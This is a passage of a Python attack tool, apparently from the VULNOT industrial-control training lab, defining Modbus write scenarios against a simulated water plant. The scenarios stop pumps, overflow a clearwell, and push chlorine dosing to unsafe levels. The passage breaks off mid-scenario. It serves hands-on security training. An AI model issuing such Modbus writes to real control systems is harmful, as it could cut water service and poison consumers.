"""
VULNOT Modbus Register Writer
Write to holding registers and coils on Modbus devices
⚠️ FOR TRAINING PURPOSES ONLY
"""

import socket
import struct
import click
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm

console = Console()

# Attack scenarios for guided learning
ATTACK_SCENARIOS = {
    'stop-pumps': {
        'name': 'Stop Distribution Pumps',
        'description': 'Turn off distribution pumps causing pressure drop',
        'target_unit': 3,
        'actions': [
            {'type': 'coil', 'address': 0, 'value': 0, 'desc': 'Stop Pump P301'},
            {'type': 'coil', 'address': 1, 'value': 0, 'desc': 'Stop Pump P302'},
        ],
        'impact': 'Distribution pressure will drop, potentially causing service disruption'
    },
    'overflow-tank': {
        'name': 'Overflow Clearwell',
        'description': 'Manipulate pump speeds to overflow the clearwell',
        'target_unit': 3,
        'actions': [
            {'type': 'register', 'address': 3, 'value': 0, 'desc': 'Stop P301 output'},
            {'type': 'register', 'address': 4, 'value': 0, 'desc': 'Stop P302 output'},
        ],
        'impact': 'Clearwell will overflow as inflow exceeds outflow'
    },
    'chemical-attack': {
        'name': 'Manipulate Chemical Dosing',
        'description': 'Change chlorine dosing to dangerous levels',
        'target_unit': 2,
        'actions': [
            {'type': 'register', 'address': 9, 'value': 10000, 'desc': 'Max chemical valve opening'},
        ],
        'impact': 'Chlorine levels could become unsafe for consumption'
    },
    'pressure-surge': {
